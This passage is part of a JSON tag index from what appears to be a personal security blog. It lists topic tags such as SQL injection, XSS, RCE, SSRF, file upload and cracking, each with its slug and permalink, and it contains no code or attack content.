E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"},{"name":"审计技巧","slug":"审计技巧","permalink":"https://j3f5.github.io/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"},{"name":"JWT","slug":"JWT","permalink":"https://j3f5.github.io/tags/JWT/"},{"name":"反序列化","slug":"反序列化","permalink":"https://j3f5.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"},{"name":"XXE","slug":"XXE","permalink":"https://j3f5.github.io/tags/XXE/"},{"name":"业务逻辑","slug":"业务逻辑","permalink":"https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"},{"name":"文件包含","slug":"文件包含","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件读取","slug":"文件读取","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://j3f5.github.io/tags/SSRF/"},{"name":"劫持","slug":"劫持","permalink":"https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"},{"name":"跨域","slug":"跨域","permalink":"https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"},{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"车联网标准","slug":"车联网标准","permalink":"https://j3f5.github.io/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/"},{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}